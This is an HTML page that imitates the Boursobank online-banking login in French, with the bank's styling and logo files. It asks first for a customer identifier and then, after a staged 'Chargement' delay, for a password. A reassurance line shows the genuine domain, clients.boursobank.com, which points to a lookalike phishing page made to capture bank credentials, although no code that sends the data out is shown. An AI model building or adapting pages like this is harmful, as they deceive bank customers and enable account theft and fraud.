<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire - Boursobank</title>
    <style>
        /* Corps général */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to bottom, #f3f4fc, #eef4fc);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        /* Conteneur principal */
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        /* Logo principal */
        .top-logo {
            margin-bottom: 70px;
            width: 100%;
            height: 20%;
        }

        .top-logo img {
            max-width: 200px;
        }

        /* Formulaire */
        .form-box {
            background: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
            height: 550px;
            position: relative;
            overflow: hidden;
        }

        /* Bande rose */
        .header-bar {
            background: linear-gradient(to right, #d9007f, #ff007a);
            height: 10px;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
        }

        /* Contenu du formulaire */
        .form-content {
            padding: 70px;
        }

        .form-logo img {
            max-width: 50px;
            margin-bottom: 15px;
        }

        /* Titre principal */
        h1 {
            font-weight: 500;
            color: #003883;
            font-size: 1.3rem;
            margin-bottom: 10px;
        }

        .verification-text {
            font-size: 0.7rem;
            margin-bottom: 5px;
            color: #667e9b !important;
        }

        .verification-box {
            color: #27ae60;
            font-size: 0.9rem;
            margin-bottom: 20px;
        }

        /* Input style */
        .input-line {
            border: none;
            border-bottom: 2px solid #00bfff;
            outline: none;
            font-size: 1rem;
            padding: 5px;
            width: 100%;
            letter-spacing: 3px;
            text-transform: uppercase;
        }

        /* Bouton */
        .btn {
            background: #ff006f;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1rem;
            transition: background 0.3s;
            width: 100%;
        }

        .btn:hover {
            background: #e60064b1;
        }

        /* Chargement */
        .loading-text {
            font-size: 1.2rem;
            font-weight: bold;
            color: #d9007f;
            display: none;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo principal -->
        <div class="top-logo">
            <img src="rvb-logo-3000_original_original-1024x188.png" alt="Logo Principal">
        </div>

        <!-- Boîte du formulaire -->
        <div class="form-box">
            <!-- Bande rose -->
            <div class="header-bar"></div>

            <!-- Contenu -->
            <div class="form-content" id="formStep1">
                <!-- Logo secondaire -->
                <div class="form-logo">
                    <img src="instruments-logo-4677.png" alt="Logo Secondaire">
                </div>

                <!-- Titre -->
                <h1>Mon identifiant</h1>

                <!-- Texte de vérification -->
                <div class="verification-text">
                    Veuillez toujours vérifier que vous êtes sur la bonne adresse
                </div>
                <div class="verification-box">
                    clients.boursobank.com
                </div>

                <!-- Champ identifiant -->
                <input type="text" class="input-line" required maxlength="19">

                <!-- Bouton -->
                <button class="btn" onclick="startLoading()">Suivant</button>
            </div>

            <!-- Formulaire mot de passe -->
            <div class="form-content" id="formStep2" style="display: none;">
                <h1>Mon mot de passe</h1>
                <input type="password" class="input-line" required maxlength="19" placeholder="Entrez votre mot de passe">
                <button class="btn">Se connecter</button>
            </div>

            <!-- Texte de chargement -->
            <div class="loading-text" id="loadingText">Chargement<span id="loadingDots"></span></div>
        </div>
    </div>

    <script>
        function startLoading() {
            const formStep1 = document.getElementById('formStep1');
            const loadingText = document.getElementById('loadingText');
            const loadingDots = document.getElementById('loadingDots');
            const formStep2 = document.getElementById('formStep2');

            // Masquer le formulaire d'identifiant et afficher le texte de chargement
            formStep1.style.display = 'none';
            loadingText.style.display = 'block';

            // Ajouter des points de chargement dynamiques
            let dotCount = 0;
            const interval = setInterval(() => {
                dotCount = (dotCount + 1) % 4; // Boucle entre 0, 1, 2, 3
                loadingDots.textContent = '.'.repeat(dotCount);
            }, 500);

            // Après 3 secondes, passer au formulaire de mot de passe
            setTimeout(() => {
                clearInterval(interval);
                loadingText.style.display = 'none';
                formStep2.style.display = 'block';
            }, 3000);
        }
    </script>
</body>
</html>
